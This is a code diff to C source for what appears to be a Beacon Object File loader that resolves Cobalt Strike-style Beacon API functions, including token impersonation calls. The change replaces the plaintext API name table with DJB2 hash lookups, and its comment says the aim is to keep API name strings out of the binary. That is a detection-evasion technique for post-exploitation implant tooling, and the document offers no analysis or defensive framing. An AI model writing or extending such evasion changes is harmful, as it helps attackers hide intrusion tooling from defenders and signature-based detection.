@@ -108,10 +108,6 @@ typedef struct {
 
 /* ─── Function pointer table for Beacon API ─── */
 
-typedef struct {
-    const char *name;
-    void       *address;
-} FuncEntry;
 
 /* Beacon API functions — defined in beacon_api.c */
 extern void  __cdecl BeaconPrintf(int type, const char *fmt, ...);
@@ -155,25 +151,30 @@ static BOOL resolve_symbol(const char *name, void **out_addr, BOOL *out_indirect
     if (clean[0] == '_' && strncmp(name, "__imp_", 6) != 0)
         clean = clean + 1;
 
-    /* Check Beacon API table */
-    static const FuncEntry beacon_api[] = {
-        { "BeaconPrintf",         (void*)BeaconPrintf },
-        { "BeaconOutput",         (void*)BeaconOutput },
-        { "BeaconDataParse",      (void*)BeaconDataParse },
-        { "BeaconDataExtract",    (void*)BeaconDataExtract },
-        { "BeaconDataInt",        (void*)BeaconDataInt },
-        { "BeaconDataShort",      (void*)BeaconDataShort },
-        { "BeaconDataLength",     (void*)BeaconDataLength },
-        { "BeaconIsAdmin",        (void*)BeaconIsAdmin },
-        { "BeaconRevertToken",    (void*)BeaconRevertToken },
-        { "BeaconUseToken",       (void*)BeaconUseToken },
-        { "BeaconGetSpawnTo",     (void*)BeaconGetSpawnTo },
-        { NULL, NULL }
+    /* Check Beacon API table via hash — no plaintext API name strings in binary */
+    /* DJB2 hash inline */
+    DWORD _sym_hash = 5381;
+    for (const char *_p = clean; *_p; _p++)
+        _sym_hash = ((_sym_hash << 5) + _sym_hash) + (unsigned char)*_p;
+
+    static const struct { DWORD hash; void *addr; } _bapi[] = {
+        { 0x700D8660, (void*)BeaconPrintf },
+        { 0x6DF4B81E, (void*)BeaconOutput },
+        { 0xE2494BA2, (void*)BeaconDataParse },
+        { 0x80D46722, (void*)BeaconDataExtract },
+        { 0xAF1AFDD2, (void*)BeaconDataInt },
+        { 0xE2835EF7, (void*)BeaconDataShort },
+        { 0x22641D29, (void*)BeaconDataLength },
+        { 0x566264D2, (void*)BeaconIsAdmin },
+        { 0xF2744BA6, (void*)BeaconRevertToken },
+        { 0x889E48BB, (void*)BeaconUseToken },
+        { 0x1E7C9FB9, (void*)BeaconGetSpawnTo },
+        { 0, NULL }
     };
 
-    for (int i = 0; beacon_api[i].name != NULL; i++) {
-        if (strcmp(clean, beacon_api[i].name) == 0) {
-            void *func_ptr = beacon_api[i].address;
+    for (int i = 0; _bapi[i].addr != NULL; i++) {
+        if (_sym_hash == _bapi[i].hash) {
+            void *func_ptr = _bapi[i].addr;
 
             /* If original had __imp_ prefix, create indirect pointer */
             if (strncmp(name, "__imp_", 6) == 0) {
